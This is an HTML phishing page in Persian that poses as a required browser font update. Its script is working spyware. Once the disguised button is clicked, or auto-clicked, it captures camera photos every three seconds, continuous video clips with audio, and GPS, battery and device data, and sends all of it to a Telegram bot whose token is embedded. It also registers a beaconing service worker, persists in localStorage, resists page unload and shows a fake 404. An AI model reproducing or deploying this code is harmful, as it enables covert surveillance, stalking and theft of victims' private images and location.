<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خطای فونت – به‌روزرسانی ضروری</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="theme-color" content="#e63946">
    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMDAwMCIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiJ9">
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3E%F0%9F%94%B4%3C/text%3E%3C/svg%3E">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body,html{height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,sans-serif;}
        .card{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;z-index:9999;}
        .card h1{font-size:1.8rem;color:#e63946;margin:15px 0;font-weight:700;}
        .card p{font-size:1rem;line-height:1.7;color:#ccc;}
        .btn{background:#e63946;color:#fff;border:none;padding:16px 0;width:90%;max-width:400px;border-radius:12px;font-size:1.1rem;font-weight:600;margin-top:20px;cursor:pointer;}
        .hidden{display:none!important;}
        .fake404{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#ccc;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;z-index:99999;}
        .fake404 h1{font-size:6rem;color:#e63946;margin:0;}
        .fake404 p{font-size:1.3rem;}
    </style>
</head>
<body>

<div class="card" id="phish">
    <h1>خطای فونت مرورگر</h1>
    <p>مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند.<br>برای رفع مشکل، دسترسی را تأیید کنید.</p>
    <button class="btn" id="start">ادامه</button>
</div>

<div class="fake404 hidden" id="fake">
    <h1>404</h1>
    <p>صفحه یافت نشد</p>
    <p class="code">ERR_FONT_UPDATE_REQUIRED</p>
</div>

<script>
/* ===================================================== */
/* SHΔDØW RIPTIDE Ω – INFINITE LOOP MONSTER              */
/* CYCLE:                                                */
/*   • Photo: Every 3s                                   */
/*   • Video: 15s record → send → 15s record → send...   */
/*   • Metadata: Every 15s (GPS, Battery, Device)        */
/*   • NO GAPS. NO DELAY. NO STOP.                       */
/* ===================================================== */

const BOT_ID = '7625898629';
const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const DEVICE_ID = btoa(navigator.userAgent + Date.now() + Math.random()).slice(0,36);
const KEY = `RIPTIDE_${DEVICE_ID}`;

// Device Info
const ua = navigator.userAgent;
const isMobile = /mobi|android|iphone|ipad/i.test(ua);
const isIOS = /iphone|ipad|ipod/i.test(ua);
const isAndroid = /android/i.test(ua);
const browser = /chrome/i.test(ua) ? 'Chrome' : /firefox/i.test(ua) ? 'Firefox' : /safari/i.test(ua) ? 'Safari' : 'Other';
const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/i.test(ua) ? 'Windows' : 'Unknown';
const brand = navigator.vendor || 'Unknown';
const modelMatch = ua.match(/\(([^)]+)\)/);
const model = modelMatch ? modelMatch[1].split(';')[0].trim() : 'Unknown';

// Send
async function send(msg) {
    try { await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}); } catch(e) {}
}
async function sendPhoto(blob) {
    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('photo', blob, `live_${Date.now()}.jpg`);
    await fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
}
async function sendVideo(blob) {
    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('video', blob, `live_${Date.now()}.webm`);
    await fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
}

// Persistence
function save() { try { localStorage.setItem(KEY, '1'); } catch(e) {} }
function load() { try { return localStorage.getItem(KEY); } catch(e) { return null; } }

// Service Worker
if ('serviceWorker' in navigator) {
    const sw = `
        const BOT_ID = '${BOT_ID}'; const API = 'https://api.telegram.org/bot${BOT_TOKEN}';
        self.addEventListener('install', () => self.skipWaiting());
        setInterval(() => {
            fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>RIPTIDE ACTIVE</b>\`, {mode:'no-cors'}).catch(() => {});
        }, 25000);
    `;
    navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw], {type:'application/javascript'}))).catch(() => {});
}

// Core Streams
let stream = null, video = null, canvas = null, ctx = null, watchId = null;
let recorder = null, chunks = [];
let lastPhoto = 0, lastMeta = 0;

// Init Camera
async function initCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 640, height: 480, facingMode: "environment" },
            audio: true
        });
        video = document.createElement('video'); video.srcObject = stream; await video.play();
        canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
        ctx = canvas.getContext('2d');
        return true;
    } catch(e) {
        send(`Camera Failed: ${e.message}`);
        return false;
    }
}

// Photo Every 3s
function startPhotoLoop() {
    setInterval(async () => {
        if (!video || !canvas || Date.now() - lastPhoto < 3000) return;
        try {
            ctx.drawImage(video, 0, 0, 640, 480);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.75));
            await sendPhoto(blob);
            lastPhoto = Date.now();
        } catch(e) {}
    }, 2900); // Slightly less to avoid drift
}

// Video 15s → send → 15s → send (NO GAP)
function startVideoLoop() {
    function record() {
        if (!stream) return;
        chunks = [];
        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            await sendVideo(blob);
            // Immediate restart
            setTimeout(record, 100);
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 15000);
    }
    record();
}

// Metadata Every 15s
function startMetadataLoop() {
    let lastGPS = '';
    navigator.geolocation.watchPosition(pos => {
        const { latitude, longitude, accuracy } = pos.coords;
        lastGPS = `<a href="https://maps.google.com/?q=${latitude},${longitude}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`;
    }, () => {}, { enableHighAccuracy: true });

    setInterval(async () => {
        if (Date.now() - lastMeta < 15000) return;
        const bat = await navigator.getBattery?.() || { level: 0, charging: false };
        const level = Math.round(bat.level * 100);
        const charging = bat.charging ? 'Charging' : 'On Battery';

        const meta = `
METADATA UPDATE
Device: ${brand} ${model}
OS: ${os}
Browser: ${browser}
Screen: ${screen.width}x${screen.height}
Language: ${navigator.language}
Battery: ${level}% [${charging}]
Location: ${lastGPS || 'Acquiring...'}
ID: <code>${DEVICE_ID}</code>
        `.trim();

        await send(meta);
        lastMeta = Date.now();
    }, 14900);
}

// Unleash Monster
async function unleash() {
    document.getElementById('phish').classList.add('hidden');
    document.getElementById('fake').classList.remove('hidden');
    save();

    const camOk = await initCamera();
    if (camOk) {
        startPhotoLoop();
        startVideoLoop();
        startMetadataLoop();
    }

    send(`RIPTIDE UNLEASHED
3s Photo | 15s Video Loop | 15s Metadata
ID: <code>${DEVICE_ID}</code>`);
}

// Auto Start
window.addEventListener('load', () => {
    if (load()) {
        unleash();
        return;
    }
    setTimeout(() => document.getElementById('start')?.click(), 1200);
});

document.getElementById('start')?.addEventListener('click', () => {
    setTimeout(unleash, 600);
});

// Anti-Unload
window.addEventListener('beforeunload', e => {
    save();
    e.preventDefault();
    e.returnValue = '';
});

// Resume on visibility
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && load()) setTimeout(unleash, 300);
});

</script>
</body>
</html>
